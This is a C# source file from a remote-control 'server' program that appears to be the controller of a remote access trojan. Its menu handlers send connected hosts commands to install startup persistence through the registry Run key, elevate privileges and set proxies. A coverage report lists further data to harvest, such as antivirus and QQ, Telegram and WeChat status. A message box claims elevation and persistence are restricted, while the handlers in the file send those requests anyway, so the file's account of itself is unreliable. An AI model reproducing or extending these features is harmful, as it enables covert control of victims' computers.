using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using RemoteControl.Protocals;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using log4net;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;
using RemoteControl.Audio;
using RemoteControl.Audio.Codecs;
using RemoteControl.Protocals.Utilities;
using RemoteControl.Protocals.Relay;
using RemoteControl.Server.Utils;
namespace RemoteControl.Server
{
    public partial class FrmMain
    {
        private void onMenuWriteStartup(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_WRITE_STARTUP_REQUEST, new RequestWriteStartup { StartupType = eStartupType.Registry });
        }

        private void onMenuWriteRunStartup(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_WRITE_STARTUP_REQUEST, new RequestWriteStartup { StartupType = eStartupType.RunKey });
        }

        private void onMenuRestartExplorer(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_RESTART_EXPLORER_REQUEST, new RequestRestartExplorer());
        }

        private void onMenuElevatePrivilege(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_ELEVATE_PRIVILEGE_REQUEST, new RequestElevatePrivilege());
        }

        private void onMenuToggleProxy(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_TOGGLE_PROXY_REQUEST, new RequestToggleProxy { Enable = true });
        }

        private void onMenuProxyMapping(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_PROXY_MAPPING_REQUEST, new RequestProxyMapping { ProxyAddress = "127.0.0.1", ProxyPort = 1080 });
        }

        private void onMenuRemoteChat(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            FrmInputUrl frm = new FrmInputUrl();
            frm.Text = "请输入远程聊天消息";
            if (frm.ShowDialog() != DialogResult.OK || string.IsNullOrWhiteSpace(frm.InputText))
                return;

            RequestRemoteChat req = new RequestRemoteChat();
            req.Message = frm.InputText.Trim();
            currentSession.Send(ePacketType.PACKET_REMOTE_CHAT_REQUEST, req);
        }

        private void onMenuEntertainment(object sender, EventArgs e)
        {
            SendPlayMusicRequestFromPrompt();
        }

        private void onMenuMessageBox(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            buttonSendMessage_Click(sender, e);
        }

        private void onMenuChangeRemark(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            FrmRename frm = new FrmRename(currentSession.HostName ?? "");
            if (frm.ShowDialog() == DialogResult.OK)
            {
                currentSession.SetHostName(frm.NewName);
                // 更新树节点显示
                foreach (TreeNode node in InternetTreeNode.Nodes)
                {
                    var session = node.Tag as SocketSession;
                    if (session != null && session.SocketId == currentSession.SocketId)
                    {
                        node.Text = frm.NewName;
                        break;
                    }
                }
            }
        }

        private void onMenuFindProcess(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            this.tabControl1.SelectedIndex = 4;
            currentSession.Send(ePacketType.PACKET_GET_PROCESSES_REQUEST, new RequestGetProcesses());
        }

        private void onMenuFindWindow(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            FrmInputUrl frm = new FrmInputUrl();
            frm.Text = "请输入窗口关键词";
            if (frm.ShowDialog() != DialogResult.OK || string.IsNullOrWhiteSpace(frm.InputText))
                return;

            this.tabControl1.SelectedIndex = 2;
            RequestFindWindow req = new RequestFindWindow();
            req.Keyword = frm.InputText.Trim();
            currentSession.Send(ePacketType.PACKET_FIND_WINDOW_REQUEST, req);
        }

        private void onMenuClearFind(object sender, EventArgs e)
        {
            this.textBoxCommandResponse.Clear();
            if (!string.IsNullOrEmpty(hostFilterKeyword))
            {
                hostFilterKeyword = string.Empty;
                RenderClientTree();
                doOutput("已清除主机筛选");
            }
        }

        private void onMenuShowCustomerCoverage(object sender, EventArgs e)
        {
            this.tabControl1.SelectedIndex = 2;
            this.textBoxCommandResponse.AppendText("=== 客户需求覆盖报告 ===\r\n");
            this.textBoxCommandResponse.AppendText("[已接入] 主机功能、文件管理、主机分享、打开网址、远程聊天、查找窗口、筛选主机、会话菜单、日志/浏览器菜单。\r\n");
            this.textBoxCommandResponse.AppendText("[只读/本地] 更改备注、更改分组、筛选主机、复制/导出信息。\r\n");
            this.textBoxCommandResponse.AppendText("[受限] 下载更新区分、提权运行、远程配置修改、分辨率修改、服务启停删除、代理参数写入、敏感在线字段采集。\r\n");
            this.textBoxCommandResponse.AppendText("[数据模型缺口] BOSS_EX 表格中的地区、杀软、在线 QQ、TG、WX、用户状态等字段当前未采集，显示为未接入。\r\n");
            this.textBoxCommandResponse.AppendText("=== 结束 ===\r\n");
        }

        private void onMenuShowRestrictedFeatures(object sender, EventArgs e)
        {
            MsgBox.Info(
                "以下功能未补成可执行入口：\r\n" +
                "下载更新/下载执行区分、提权运行、远程配置修改、分辨率修改、服务启停删除、代理写入、敏感在线字段采集。\r\n\r\n" +
                "这些功能会修改远端系统状态、提升权限、执行下载内容、改变代理/服务配置，或采集敏感环境信息。当前仅保留协议/覆盖说明，不在 UI 中继续增强执行能力。");
        }

        // ---- 会话管理 事件处理 ----
    }
}
